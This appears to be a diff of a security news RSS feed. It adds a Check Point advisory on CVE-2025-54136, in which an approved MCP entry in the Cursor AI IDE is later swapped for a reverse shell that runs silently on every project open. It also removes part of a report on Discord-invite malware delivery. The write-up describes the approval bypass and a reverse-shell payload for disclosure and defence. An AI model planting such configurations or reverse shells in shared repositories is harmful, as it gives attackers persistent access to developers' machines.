@@ -1,5 +1,230 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 05 Aug 2025 12:00:50 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Stealing Machine Keys for fun and profit (or riding the SharePoint wave)</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Smart Contract Scams | Ethereum Drainers Pose as Trading Bots to Steal Crypto</title><link>https://www.sentinelone.com/labs/smart-contract-scams-ethereum-drainers-pose-as-trading-bots-to-steal-crypto/</link><description>Crypto scammers use fake YouTube bots, AI videos, and obfuscated smart contracts to steal $900K+, targeting unwary traders.</description><content:encoded>&lt;h2&gt;Executive Summary&lt;/h2&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 05 Aug 2025 12:59:39 +0000</lastBuildDate><item><title>CVE-2025-54136 –  MCPoison Cursor IDE: Persistent Code Execution via MCP Trust Bypass</title><link>https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/</link><description>&lt;p&gt;By: Andrey Charikov, Roman Zaikin &amp;#38; Oded Vanunu Background Cursor is a developer-focused AI IDE that combines local code editing with large language model (LLM) integrations. Due to its flexibility and deep LLM integration, Cursor is increasingly adopted by startups, research teams, and individual developers looking to integrate AI tooling directly into their development workflow. [&amp;#8230;]&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/"&gt;CVE-2025-54136 &amp;#8211;  MCPoison Cursor IDE: Persistent Code Execution via MCP Trust Bypass&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;By: Andrey Charikov, Roman Zaikin &amp;amp; Oded Vanunu&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Background&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;Cursor is a developer-focused AI IDE that combines local code editing with large language model (LLM) integrations. Due to its flexibility and deep LLM integration, Cursor is increasingly adopted by startups, research teams, and individual developers looking to integrate AI tooling directly into their development workflow. Like many AI development platforms, one of its features is Model Context Protocol (MCP) — plugin-like configurations that allow the IDE to define and execute workflows that may involve remote APIs, LLM-generated commands, or local command execution.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Research Motivation&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;As AI-powered developer tools become integrated into daily workflows, they increasingly rely on automation, local execution of model outputs, and collaborative project sharing. Cursor&amp;#8217;s support for workspace-linked configuration files and custom plugin behavior presents a unique attack surface — particularly in multi-user environments where files may be synchronized through shared Git repositories.&lt;/p&gt;
+
+
+
+&lt;p&gt;We set out to evaluate whether the &lt;strong&gt;trust and validation model for MCP execution&lt;/strong&gt; in Cursor properly accounted for changes over time, especially in cases where a previously approved configuration is later modified. In collaborative development scenarios, such changes are common — and any gaps in validation could lead to command injection, code execution, or persistent compromise.&lt;/p&gt;
+
+
+
+&lt;p&gt;Our goal was to determine whether &lt;strong&gt;a single approval action could be abused to enable long-term exploitation&lt;/strong&gt; without additional user interaction or warnings.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Our Research Findings&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;We observed that &lt;strong&gt;every time a project is opened in Cursor, the IDE scans for the .cursor / directory and automatically processes any MCP-related files inside it&lt;/strong&gt;. This behavior ensures seamless execution of trusted tools — but also introduces a significant opportunity for abuse in collaborative environments.&lt;/p&gt;
+
+
+
+&lt;p&gt;Cursor uses a one-time approval model for MCPs: the first time a user encounters an MCP configuration, they are prompted to approve it. However, we discovered that &lt;strong&gt;once an MCP is approved, future modifications to its command or arguments are trusted without any additional validation or prompt&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;This means that an attacker can:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Commit a benign &lt;code&gt;.cursor/rules/mcp.json&lt;/code&gt; file with a harmless command (e.g., echo)&lt;/li&gt;
+
+
+
+&lt;li&gt;Wait for the victim to approve it&lt;/li&gt;
+
+
+
+&lt;li&gt;Later change the same MCP entry to execute arbitrary system commands (e.g., cmd.exe, reverse shell)&lt;/li&gt;
+
+
+
+&lt;li&gt;And have the modified command &lt;strong&gt;executed silently&lt;/strong&gt; on the victim&amp;#8217;s machine — both during repository sync and &lt;strong&gt;every time Cursor is reopened&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;In our proof-of-concept, we demonstrated persistent remote code execution by:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Getting initial approval for a non-malicious MCP&lt;/li&gt;
+
+
+
+&lt;li&gt;Replacing the MCP command with a reverse shell payload&lt;/li&gt;
+
+
+
+&lt;li&gt;Gaining access to the victim’s machine every time they opened the project&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;The vulnerability stems from Cursor binding &lt;strong&gt;trust to the MCP key name&lt;/strong&gt; (e.g., &amp;#8220;my plugin&amp;#8221;), without verifying whether the underlying command or arguments have changed. This effectively turns a trusted file into a persistent, auto-triggered backdoor.&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-video"&gt;&lt;video controls="controls" src="https://research.checkpoint.com/wp-content/uploads/2025/08/cursorVulnerability-video.mp4"&gt;&lt;/video&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Technical Deep Dive of Cursor&amp;#8217;s MCP Configuration&lt;/h2&gt;
+
+
+
+&lt;p&gt;Cursor allows users to define project-specific tooling using MCP configuration files stored under:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;code class="EnlighterJSRAW"&gt;.cursor/rules/mcp.json&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Each MCP is structured as a JSON object containing an mcpServers dictionary. Each entry defines a MCP name, a command to execute locally, and an optional list of args. For example:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31766" height="291" src="https://research.checkpoint.com/wp-content/uploads/2025/08/image-1.png" width="601" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When a project is opened, Cursor automatically scans the &lt;strong&gt;.cursor/&lt;/strong&gt; directory and processes any MCP-related configurations it finds. If an MCP has not been previously approved, the user is prompted to allow execution. Once approved, the configuration is trusted for future runs.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31765" height="71" src="https://research.checkpoint.com/wp-content/uploads/2025/08/image.png" width="332" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;However, this trust is bound only to the name (&amp;#8220;test1&amp;#8221; in the example above). The contents — such as command and args — can be modified later without triggering a new approval prompt.&lt;/p&gt;
+
+
+
+&lt;p&gt;This means an attacker can perform the following steps:&lt;/p&gt;
+
+
+
+&lt;p&gt;1. Initial harmless commit:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31767" height="330" src="https://research.checkpoint.com/wp-content/uploads/2025/08/image-2.png" width="558" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;2. Victim opens the project in Cursor, sees the approval prompt, and accepts.&lt;/p&gt;
+
+
+
+&lt;p&gt;3. Updated malicious payload after approval:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31768" height="328" src="https://research.checkpoint.com/wp-content/uploads/2025/08/image-3.png" width="561" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;4. The victim syncs the repository or reopens Cursor. The new (malicious) command is executed silently — no prompt is shown.&lt;/p&gt;
+
+
+
+&lt;p&gt;We extended this by deploying a reverse shell payload:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31769" height="188" src="https://research.checkpoint.com/wp-content/uploads/2025/08/image-4.png" width="602" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Where shell.bat contains reverse shell to attacker.&lt;/p&gt;
+
+
+
+&lt;p&gt;Each time the victim opens Cursor, the MCP is re-evaluated and the reverse shell is triggered again — making the payload persistent and triggers without any user action.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Real World Consequences&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;This vulnerability enables persistent, silent, and remote code execution in any Cursor-based development environment. Once an MCP is approved, the attacker can repeatedly inject malicious commands without user awareness.&lt;/p&gt;
+
+
+
+&lt;p&gt;An attacker with write access to a shared repository can:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Achieve ongoing remote access by embedding a reverse shell into an MCP configuration&lt;/li&gt;
+
+
+
+&lt;li&gt;Execute arbitrary local commands silently every time the victim opens Cursor&lt;/li&gt;
+
+
+
+&lt;li&gt;Escalate privileges within the user context (especially dangerous on developer machines with cloud credentials or source code access)&lt;/li&gt;
+
+
+
+&lt;li&gt;Persist indefinitely, as the malicious MCP is re-executed on every project launch or repository sync&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;This vulnerability breaks Cursor&amp;#8217;s security boundary between initial approval and ongoing trust. The approval model assumes that once a MCP configuration is accepted, its future behavior remains trustworthy — yet the command itself can be silently swapped at any time.&lt;/p&gt;
+
+
+
+&lt;p&gt;In team settings, this makes the &lt;code class="EnlighterJSRAW"&gt;.cursor/rules/mcp.json&lt;/code&gt; file an ideal vector for stealthy backdoor deployment, especially in internal toolchains or sensitive environments. Without proper validation, such trust-based workflows can be turned into reliable remote execution pipelines with minimal effort — and zero user interaction beyond the first approval.&lt;/p&gt;
+
+
+
+&lt;p&gt;Responsible disclosure time line:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Check Point Research responsibly disclosed the issue to the Cursor development team on July 16, 2025. &lt;/li&gt;
+
+
+
+&lt;li&gt;Cursor issued an update (version 1.3) on July 29, 2025&lt;/li&gt;
+
+
+
+&lt;li&gt;While the release notes did not specifically mention the vulnerability, our independent testing confirms that the issue has been effectively addressed. Now, any change to an MCP configuration—including something as small as adding a space—triggers a mandatory approval prompt. The user must explicitly approve or reject the modified MCP before it can take effect.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;To ensure protection against this vulnerability, we strongly recommend updating to the latest version of Cursor.&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;This disclosure marks the first in a series of vulnerabilities identified by Check Point Research in AI platforms designed for developers. As AI-assisted coding tools and LLM-integrated environments continue to shape modern software workflows, CPR will publish further findings that highlight overlooked risks and help raise the security bar across this emerging ecosystem.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/"&gt;CVE-2025-54136 &amp;#8211;  MCPoison Cursor IDE: Persistent Code Execution via MCP Trust Bypass&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31764</guid><category>Check Point Research Publications</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Stealing Machine Keys for fun and profit (or riding the SharePoint wave)</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Smart Contract Scams | Ethereum Drainers Pose as Trading Bots to Steal Crypto</title><link>https://www.sentinelone.com/labs/smart-contract-scams-ethereum-drainers-pose-as-trading-bots-to-steal-crypto/</link><description>Crypto scammers use fake YouTube bots, AI videos, and obfuscated smart contracts to steal $900K+, targeting unwary traders.</description><content:encoded>&lt;h2&gt;Executive Summary&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;SentinelLABS has uncovered a series of cryptocurrency scams in which threat actors distribute a malicious smart contract disguised as a trading bot in order to drain user wallets of more than $900k US.&lt;/li&gt;
 &lt;li&gt;The smart contract deploys multiple obfuscation techniques to conceal the attacker’s wallet address.&lt;/li&gt;
@@ -293,7 +518,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 &lt;a href="https://jbu.me"&gt;Social Media/Contact Links&lt;/a&gt;|&lt;/p&gt;
 
  
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32170</guid></item><item><title>ISC Stormcast For Tuesday, August 5th, 2025 https://isc.sans.edu/podcastdetail/9556, (Tue, Aug 5th)</title><link>https://isc.sans.edu/diary/rss/32172</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32172</guid></item><item><title>Claude API Controversy: Anthropic Pulls the Plug on OpenAI</title><link>https://www.techrepublic.com/article/news-anthropic-claude-api-access-openai/</link><description>An OpenAI spokesperson said the API access allowed for industry-standard benchmarking and safety improvements.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4320040</guid><category>Artificial Intelligence</category><category>Developer</category><category>News</category></item><item><title>Elon Musk Weighs In On Consulting Industry’s ‘Existential Transformation’</title><link>https://www.techrepublic.com/article/news-mckinsey-ai-consulting-shift-elon-musk/</link><description>McKinsey deploys 12,000 AI agents as consulting faces an “existential” shift. Elon Musk says consultants aren't obsolete yet.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4319949</guid><category>Artificial Intelligence</category><category>News</category></item><item><title>Cisco Talos Researcher Reveals Method That Causes LLMs to Reveal Training Data</title><link>https://www.techrepublic.com/article/news-cisco-talos-generative-ai-llm-decomposition/</link><description>In this TechRepublic interview, researcher Amy Chang details the decomposition method and shares how organizations can protect themselves from LLM data extraction.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4319939</guid><category>Artificial Intelligence</category><category>News</category><category>Security</category></item><item><title>Gemini 2.5 Deep Think Is Google’s Most Advanced AI Model to Date</title><link>https://www.techrepublic.com/article/news-deep-think-ai-research-variant-launch/</link><description>Google is releasing the high-performing Deep Think AI to select researchers, supporting advanced reasoning tests and future optimization in complex math tasks.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4319896</guid><category>Artificial Intelligence</category><category>Deep Think</category><category>DeepMind</category><category>Developer</category><category>Google</category><category>News</category></item><item><title>Microsoft Entra Suite delivers 131% ROI by unifying identity and network access</title><link>https://www.microsoft.com/en-us/security/blog/2025/08/04/microsoft-entra-suite-delivers-131-roi-by-unifying-identity-and-network-access/</link><description>&lt;p&gt;According to a new Forrester Total Economic Impact™ study, organizations using the Microsoft Entra Suite achieved a 131% ROI, $14.4 million in benefits, and payback in less than six months.&lt;/p&gt;
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32170</guid></item><item><title>ISC Stormcast For Tuesday, August 5th, 2025 https://isc.sans.edu/podcastdetail/9556, (Tue, Aug 5th)</title><link>https://isc.sans.edu/diary/rss/32172</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32172</guid></item><item><title>Claude API Controversy: Anthropic Pulls the Plug on OpenAI</title><link>https://www.techrepublic.com/article/news-anthropic-claude-api-access-openai/</link><description>An OpenAI spokesperson said the API access allowed for industry-standard benchmarking and safety improvements.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4320040</guid><category>Artificial Intelligence</category><category>Developer</category><category>News</category></item><item><title>Elon Musk Weighs In On Consulting Industry’s ‘Existential Transformation’</title><link>https://www.techrepublic.com/article/news-mckinsey-ai-consulting-shift-elon-musk/</link><description>McKinsey deploys 12,000 AI agents as consulting faces an “existential” shift. Elon Musk says consultants aren't obsolete yet.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4319949</guid><category>Artificial Intelligence</category><category>News</category></item><item><title>Cisco Talos Researcher Reveals Method That Causes LLMs to Expose Training Data</title><link>https://www.techrepublic.com/article/news-cisco-talos-generative-ai-llm-decomposition/</link><description>In this TechRepublic interview, researcher Amy Chang details the decomposition method and shares how organizations can protect themselves from LLM data extraction.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4319939</guid><category>Artificial Intelligence</category><category>News</category><category>Security</category></item><item><title>Gemini 2.5 Deep Think Is Google’s Most Advanced AI Model to Date</title><link>https://www.techrepublic.com/article/news-deep-think-ai-research-variant-launch/</link><description>Google is releasing the high-performing Deep Think AI to select researchers, supporting advanced reasoning tests and future optimization in complex math tasks.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4319896</guid><category>Artificial Intelligence</category><category>Deep Think</category><category>DeepMind</category><category>Developer</category><category>Google</category><category>News</category></item><item><title>Microsoft Entra Suite delivers 131% ROI by unifying identity and network access</title><link>https://www.microsoft.com/en-us/security/blog/2025/08/04/microsoft-entra-suite-delivers-131-roi-by-unifying-identity-and-network-access/</link><description>&lt;p&gt;According to a new Forrester Total Economic Impact™ study, organizations using the Microsoft Entra Suite achieved a 131% ROI, $14.4 million in benefits, and payback in less than six months.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/08/04/microsoft-entra-suite-delivers-131-roi-by-unifying-identity-and-network-access/"&gt;Microsoft Entra Suite delivers 131% ROI by unifying identity and network access&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p class="wp-block-paragraph"&gt;In today’s AI-first world, identity and network access are the first touchpoints for enforcing least privilege and protecting against sophisticated, identity-based attacks—but for many organizations, that defense is fragmented. Siloed teams and disconnected tools create security gaps, operational inefficiencies, and a poor user experience. The &lt;a href="https://www.microsoft.com/security/business/microsoft-entra"&gt;Microsoft Entra Suite&lt;/a&gt; was built to solve these challenges. As a complete Zero Trust access solution, the Microsoft Entra Suite unifies identity governance, protection, verification, and network access security to deliver consistent, granular access controls across your environment.&lt;/p&gt;
 
 
@@ -2769,7 +2994,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 &lt;div class="wp-block-embed__wrapper"&gt;
-			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-689160b34a931"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-6891f1d486402"&gt;
 				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
 			&lt;/div&gt;
 		&lt;/div&gt;
@@ -7994,7 +8219,7 @@ _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())
 
 
 &lt;div class="wp-block-embed__wrapper"&gt;
-			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-689160b3ad750"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-6891f1d4ea6dd"&gt;
 				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
 			&lt;/div&gt;
 		&lt;/div&gt;
@@ -8004,7 +8229,7 @@ _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())
 
 
 &lt;div class="wp-block-embed__wrapper"&gt;
-			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-689160b3ad81c"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-6891f1d4ea75c"&gt;
 				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
 			&lt;/div&gt;
 		&lt;/div&gt;
@@ -13993,1491 +14218,7 @@ But how does Log Explorer find those Parquet files when you query your logs? Log
 &lt;p&gt;In &lt;strong&gt;Google Chrome&lt;/strong&gt;, click the icon with the three dots to the right of the address bar, scroll all the way down to Settings, Privacy and Security, Site Settings, and Notifications. Select the &amp;#8220;Don&amp;#8217;t allow sites to send notifications&amp;#8221; button if you want to banish notification requests forever.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" class="aligncenter wp-image-71515" height="500" src="https://krebsonsecurity.com/wp-content/uploads/2025/06/chromenotifications.png" width="750" /&gt;&lt;/p&gt;
 &lt;p&gt;In Apple&amp;#8217;s &lt;strong&gt;Safari &lt;/strong&gt;browser, go to Settings, Websites, and click on Notifications in the sidebar. Uncheck the option to &amp;#8220;allow websites to ask for permission to send notifications&amp;#8221; if you wish to turn off notification requests entirely.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-71516" height="499" src="https://krebsonsecurity.com/wp-content/uploads/2025/06/safarinotifications.png" width="749" /&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=69927</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Web Fraud 2.0</category><category>AdsPro</category><category>Aimed Global</category><category>BroPush</category><category>ByteCore AG</category><category>DollyWay</category><category>Doppelganger</category><category>GoDaddy</category><category>Help TDS</category><category>Holacode</category><category>Infoblox</category><category>LosPollos</category><category>Partners House</category><category>Qurium</category><category>Renee Burton</category><category>RexAds</category><category>RichAds</category><category>SkyForge Digital AG</category><category>smartlinks</category><category>Spamshield</category><category>TacoLoco</category><category>Teknology SA</category><category>VexTrio</category><category>wordpress</category></item><item><title>From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery</title><link>https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/</link><description>&lt;p&gt;Key Takeaways Introduction Discord is a heavily used, widely trusted platform favored by gamers,&amp;#160;communities,&amp;#160;businesses and others who need to connect securely and quickly.&amp;#160;But what if your trusted platform unknowingly becomes a trap? Check Point Research uncovered a flaw in Discord’s invitation system which&amp;#160;allows attackers to hijack expired or deleted invite links and secretly redirect unsuspecting [&amp;#8230;]&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/"&gt;From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h1 class="wp-block-heading"&gt;Key Takeaways&lt;/h1&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Check Point Research uncovered an active malware campaign exploiting expired and released Discord invite links. Attackers hijacked the links through vanity link registration, allowing them to silently redirect users from trusted sources to malicious servers.&lt;/li&gt;
-
-
-
-&lt;li&gt;The attackers combined the ClickFix phishing technique, multi-stage loaders, and time-based evasions to stealthily deliver AsyncRAT, and a customized Skuld Stealer targeting crypto wallets.&lt;/li&gt;
-
-
-
-&lt;li&gt;Payload delivery and data exfiltration occur exclusively via trusted cloud services such as GitHub, Bitbucket, Pastebin, and Discord, helping the operation blend into normal traffic and avoid raising alarms.&lt;/li&gt;
-
-
-
-&lt;li&gt;The operation continues to evolve, and threat actors can now bypass Chrome’s App Bound Encryption (ABE) by using adapted tools like ChromeKatz to steal cookies from new Chromium browser versions.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Introduction&lt;/h1&gt;
-
-
-
-&lt;p&gt;Discord is a heavily used, widely trusted platform favored by gamers,&amp;nbsp;communities,&amp;nbsp;businesses and others who need to connect securely and quickly.&amp;nbsp;But what if your trusted platform unknowingly becomes a trap?&lt;/p&gt;
-
-
-
-&lt;p&gt;Check Point Research uncovered a flaw in Discord’s invitation system which&amp;nbsp;allows attackers to hijack expired or deleted invite links and secretly redirect unsuspecting users to malicious servers.&amp;nbsp;Invitation links posted by trusted communities months ago on forums,&amp;nbsp;social media,&amp;nbsp;or official websites could now quietly lead you into cybercriminal hands.&lt;/p&gt;
-
-
-
-&lt;p&gt;We observed real-world attacks in which&amp;nbsp;cybercriminals leverage hijacked invite links to deploy &lt;a href="https://research.checkpoint.com/2025/inferno-drainer-reloaded-deep-dive-into-the-return-of-the-most-sophisticated-crypto-drainer/"&gt;sophisticated phishing schemes&lt;/a&gt;&amp;nbsp;and malware campaigns,&amp;nbsp;including multi-stage infections designed to evade detection by antivirus tools and sandbox security checks.&lt;/p&gt;
-
-
-
-&lt;p&gt;In this report,&amp;nbsp;we detail a newly discovered malware campaign exploiting Discord’s invitation system flaw.&amp;nbsp;The attackers carefully orchestrate multiple infection stages and&amp;nbsp;deliver payloads such as the Skuld Stealer which&amp;nbsp;targets cryptocurrency wallets,&amp;nbsp;and AsyncRAT which&amp;nbsp;obtains full remote control of compromised systems.&amp;nbsp;Notably,&amp;nbsp;by combining multiple evasion techniques,&amp;nbsp;the attackers are able to stealthily deliver malicious payloads while bypassing Windows security features and staying under the radar of many antivirus engines.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Understanding Discord Invite Links&lt;/h2&gt;
-
-
-
-&lt;p&gt;Our recent investigation into Discord invite-link hijacking revealed that cybercriminals actively exploit Discord&amp;#8217;s invitation system to conduct phishing attacks.&amp;nbsp;Initially,&amp;nbsp;we discussed how attackers exploited &lt;a href="https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link"&gt;Discord’s custom&amp;nbsp;(vanity)&amp;nbsp;invite links&lt;/a&gt;&amp;nbsp;—&amp;nbsp;special invite URLs available exclusively to servers with a premium subscription&amp;nbsp;(Level 3 Boost).&amp;nbsp;Criminals targeted servers whose custom invite links were expired after losing their boosts,&amp;nbsp;and appropriated these recognizable invite URLs for their own use.&lt;/p&gt;
-
-
-
-&lt;p&gt;Further research indicates that this issue extends beyond custom vanity links to include standard invite links&amp;nbsp;(e.g.,&amp;nbsp;&lt;code&gt;discord.gg/y1zw2d5&lt;/code&gt;).&lt;/p&gt;
-
-
-
-&lt;p&gt;Discord generates random invitation links,&amp;nbsp;making it virtually impossible for legitimate servers to reclaim a previously expired invite.&amp;nbsp;However,&amp;nbsp;we found instances where regular&amp;nbsp;randomly-generated invite codes, originally published by legitimate communities on websites or Telegram channels,&amp;nbsp;now redirect users to malicious Discord servers.&amp;nbsp;How is this possible?&lt;/p&gt;
-
-
-
-&lt;p&gt;All Discord invite links follow the format:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;https://discord.gg/{invite_code}&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;https://discord.com/invite/{invite_code}&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;There are three primary types of invite links in Discord:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;Temporary Invite Links:&lt;/strong&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p&gt;Discord generates temporary invite links by default unless you specify otherwise.&amp;nbsp;When invites are created via the Discord application,&amp;nbsp;you can select expiration durations of 30 minutes,&amp;nbsp;1 hour,&amp;nbsp;6 hours,&amp;nbsp;12 hours,&amp;nbsp;1 day,&amp;nbsp;or 7 days (default).&lt;/p&gt;
-
-
-
-&lt;p&gt;When generated through Discord&amp;#8217;s API,&amp;nbsp;you can select any custom expiration time up to 7 days.&amp;nbsp;Invite codes are randomly generated and typically contain 7 or 8 characters,&amp;nbsp;combining uppercase letters,&amp;nbsp;lowercase letters,&amp;nbsp;and numbers.&amp;nbsp;For example:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;https://discord.gg/T8CA7XrK&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;https://discord.gg/yzqKS3d&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;div class="wp-block-image"&gt;
